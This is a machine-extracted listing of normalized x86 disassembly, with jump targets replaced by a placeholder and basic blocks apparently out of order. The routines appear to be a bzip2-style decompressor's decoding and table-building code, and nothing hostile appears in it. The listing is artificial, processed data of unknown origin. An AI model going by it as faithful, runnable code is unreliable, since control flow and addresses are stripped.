jne r-xdata
mov [ ebp - 0x124 ] 0xf
jmp r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
cmp [ ebp - 0x18 ] 0x100
jg r-xdata
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1e7c ]
mov edx [ ebp + 0x8 ]
movzx eax [ edx + ecx + 0xe7c ]
mov ecx [ ebp + 0x8 ]
mov dl [ ecx + eax + 0xd7c ]
mov [ ebp - 0x39 ] dl
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x40 ]
add edx [ ebp - 0x30 ]
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x40 ] edx
mov edx [ ebp + 0x8 ]
movzx eax [ edx + 0x28 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0x108 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x108 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
cmp eax [ ebp - 0x4c ]
jl r-xdata
mov [ ebp - 0x70 ] 0x32
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x60 ]
movzx eax [ edx + 0x1ebc ]
mov [ ebp - 0x48 ] eax
mov ecx [ ebp - 0x48 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0xf9fc ]
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xb16c ]
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xe1cc ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0x408
mov edx [ ebp + 0x8 ]
lea eax [ edx + ecx + 0xc99c ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
cmp [ ebp - 0x124 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov eax [ edx + eax * 4 ]
shr eax 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x38 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] 0x0
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov ecx [ ebp - 0x18 ]
mov edx [ eax + ecx * 4 ]
and edx 0xff
mov [ ebp - 0x39 ] dl
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x444 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4c ]
mov eax [ ebp - 0x18 ]
shl eax 0x8
or eax [ ecx + edx * 4 ]
movzx ecx [ ebp - 0x39 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + ecx * 4 + 0x444 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc4c ]
mov [ edx + ecx * 4 ] eax
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x444 ]
add edx 0x1
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x444 ] edx
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
mov esi [ ebp + 0x8 ]
mov edx [ esi + edx * 4 + 0x444 ]
mov [ ecx + eax * 4 + 0x848 ] edx
jmp r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
js r-xdata
cmp [ ebp - 0x4c ] 0x14
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
mov edx 0x1
mov ecx [ ebp - 0x4c ]
shl edx cl
sub edx 0x1
and eax edx
mov [ ebp - 0x12c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx [ ebp - 0x4c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp - 0x12c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x118 ]
add eax 0x1
mov ecx [ ebp - 0x11c ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x1e7c ] eax
jmp r-xdata
mov edx [ ebp - 0x11c ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x1e7c ]
add ecx [ ebp - 0x124 ]
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x118 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax + ecx + 0xe7c ]
mov [ edx + 0xe7c ] cl
mov edx [ ebp - 0x118 ]
sub edx 0x1
mov [ ebp - 0x118 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4c ]
mov ecx [ ebp + 0x8 ]
mov edx [ edx + eax * 4 ]
mov [ ecx + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
and ecx 0xff
movzx edx cl
mov eax [ ebp + 0x8 ]
mov [ eax + 0x3c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4c ]
mov eax [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov [ eax + 0x38 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
and eax 0xff
movzx ecx al
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp - 0x4 ]
jge r-xdata
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp - 0x14 ]
jl r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
cmp edx 0x102
jl r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax + edx * 4 ]
jg r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
shl ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov edx [ eax ]
movzx eax [ edx ]
or ecx eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
add ecx 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x20 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x11c ]
sub eax 0x1
mov [ ebp - 0x11c ] eax
mov ecx [ ebp - 0x124 ]
sub ecx 0x1
mov [ ebp - 0x124 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x14 ] 0x1
sete dl
mov eax [ ebp + 0x8 ]
xor edx [ eax + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx * 4 + rw-data ]
mov [ eax + 0x14 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x200
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x34 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
mov eax [ ebp - 0x18 ]
movzx edx [ edx + eax * 2 ]
mov eax [ ebp - 0x18 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx eax [ ecx + eax ]
mov ecx [ ebp - 0x18 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov [ ebp - 0x74 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
mov ecx [ ebp - 0x18 ]
mov dl [ eax + ecx * 2 ]
mov [ ebp - 0x39 ] dl
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x848 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
mov eax [ ebp - 0x18 ]
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x18 ]
and ecx 0x1
jne r-xdata
movzx ecx [ ebp - 0x39 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4c ]
mov edx [ ebp - 0x4 ]
mov [ eax + edx * 4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x30 ]
sub ecx 0x1
mov [ ebp - 0x30 ] ecx
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
movzx dx [ ebp - 0x39 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc50 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x30 ]
sub edx 0x1
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov [ ebp - 0x10 ] 0xfffffffc
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x5c ]
mov edx [ ebp - 0xc ]
sub edx [ ecx + eax * 4 ]
mov eax [ ebp - 0x58 ]
mov ecx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4c ]
add edx 0x1
mov [ ebp - 0x4c ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x29
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0xc ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0xc ] ecx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x74 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc54 ]
movzx eax [ edx + eax ]
and eax 0xf
mov ecx [ ebp - 0x18 ]
sar ecx 0x10
shl ecx 0x4
or eax ecx
mov edx [ ebp - 0x74 ]
sar edx 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
mov [ edx + ecx ] al
mov ecx [ ebp - 0x74 ]
sar ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc54 ]
movzx ecx [ eax + ecx ]
and ecx 0xf0
mov edx [ ebp - 0x18 ]
sar edx 0x10
or ecx edx
mov eax [ ebp - 0x74 ]
sar eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc54 ]
mov [ eax + edx ] cl
jmp r-xdata
mov ecx [ ebp - 0x18 ]
sar ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc54 ]
movzx ecx [ eax + ecx ]
and ecx 0xf
movzx edx [ ebp - 0x39 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + edx * 4 + 0x848 ]
sar edx 0x10
shl edx 0x4
or ecx edx
mov eax [ ebp - 0x18 ]
sar eax 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc54 ]
mov [ eax + edx ] cl
mov edx [ ebp - 0x18 ]
sar edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc54 ]
movzx edx [ ecx + edx ]
and edx 0xf0
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + eax * 4 + 0x848 ]
sar eax 0x10
or edx eax
mov ecx [ ebp - 0x18 ]
sar ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
mov [ ecx + eax ] dl
jmp r-xdata
mov edx [ ebp - 0xc ]
shl edx 0x1
or edx [ ebp - 0x24 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x20 ] 0x1
jl r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
mov eax [ ebp - 0x74 ]
movzx edx [ edx + eax * 2 ]
mov eax [ ebp - 0x74 ]
sar eax 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx eax [ ecx + eax ]
mov ecx [ ebp - 0x74 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov [ ebp - 0x134 ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xffff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
mov edx [ ebp - 0x74 ]
mov [ eax + edx * 2 ] cx
mov eax [ ebp - 0x74 ]
and eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x34 ]
mov [ eax + 0x38 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] 0x0
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx + 0x10 ]
test edx edx
je r-xdata
mov edx [ ebp - 0x74 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x134 ]
mov [ ebp - 0x74 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x34 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x848 ]
add edx 0x1
movzx eax [ ebp - 0x39 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x848 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x20 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1c ]
shr eax cl
and eax 0x1
mov [ ebp - 0x130 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp - 0x130 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x444
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
push edx
call sub_40aa70
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x3c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc50 ]
movzx eax [ edx + eax * 2 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
shr edx 0x1
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc54 ]
movzx edx [ ecx + edx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr edx cl
and edx 0xf
shl edx 0x10
or eax edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x38 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x440 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x440 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov edx [ ebp + 0x8 ]
add edx 0x444
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
push ecx
call sub_40aa70
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc50 ]
movzx edx [ eax + ecx * 2 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
shr ecx 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc54 ]
movzx eax [ eax + ecx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x38 ]
shl ecx 0x2
and ecx 0x4
shr eax cl
and eax 0xf
shl eax 0x10
or edx eax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x440 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x440 ] edx
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
shl edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov eax [ ecx ]
movzx ecx [ eax ]
or edx ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x20 ]
add edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x14 ] 0x1
sete al
mov ecx [ ebp + 0x8 ]
xor eax [ ecx + 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax * 4 + rw-data ]
mov [ ecx + 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x200
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ecx + 0xc ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x18 ] 0x0
mov ecx 0x1
test ecx ecx
je r-xdata
sub_410700
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc68 ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x100
jge r-xdata
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx [ ebp - 0x4 ]
movzx eax [ edx + 0xc6c ]
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc68 ]
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x4 ]
mov [ eax + edx + 0xd7c ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc68 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0xc68 ] eax
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
sub_410770
push ebp
mov ebp esp
sub esp 0x10
push esi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x1c ]
jg r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x8 ] 0x17
jge r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + 0x20 ]
jge r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x14 ]
add edx [ ebp - 0x10 ]
movzx eax [ edx ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x20 ]
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov ecx [ ebp + 0x14 ]
add ecx [ ebp - 0x8 ]
movzx edx [ ecx ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 + 0x4 ]
add ecx 0x1
mov edx [ ebp + 0x14 ]
add edx [ ebp - 0x8 ]
movzx eax [ edx ]
mov edx [ ebp + 0xc ]
mov [ edx + eax * 4 + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x8 ] 0x17
jge r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
add eax [ edx + ecx * 4 - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x17
jge r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp + 0x1c ]
jg r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov edx [ ebp + 0x18 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov esi [ ebp + 0xc ]
mov eax [ ecx + eax * 4 + 0x4 ]
sub eax [ esi + edx * 4 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x1
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax + edx * 4 ] ecx
mov ecx [ ebp - 0x4 ]
shl ecx 0x1
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp + 0x1c ]
jg r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 - 0x4 ]
